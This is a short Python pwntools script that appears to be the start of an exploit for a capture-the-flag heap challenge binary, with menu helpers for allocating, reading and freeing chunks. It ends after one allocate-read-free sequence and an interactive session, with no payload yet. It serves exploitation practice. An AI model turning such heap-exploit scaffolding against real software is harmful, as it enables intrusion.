#!/usr/bin/env python3
# coding = utf-8

# Env: Ubuntu 18.04, GLIBC 2.27-3ubuntu1.6, Kernel 4.15.0-213-generic

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

p = process('./CaNaKMgF_remastered')
elf = ELF('./CaNaKMgF_remastered')
# gdb.attach(p, "")
time.sleep(2)

def menu(option):
    p.recvuntil("5. Run away\n")
    p.sendline(option)

def allocate(size, data):
    menu("1")
    p.recvuntil("Length? ")
    p.sendline(f"{size}")
    p.send(data)

def free(index):
    menu("3")
    p.recvuntil("Num? ")
    p.sendline(f"{index}")

def read(index):
    menu("4")
    p.recvuntil("Num? ")
    p.sendline(f"{index}")
    data = p.recvuntil("\n1. Allocate\n")
    return data[:-13]


allocate(100, 'xx')
read(0)
free(0)
p.interactive()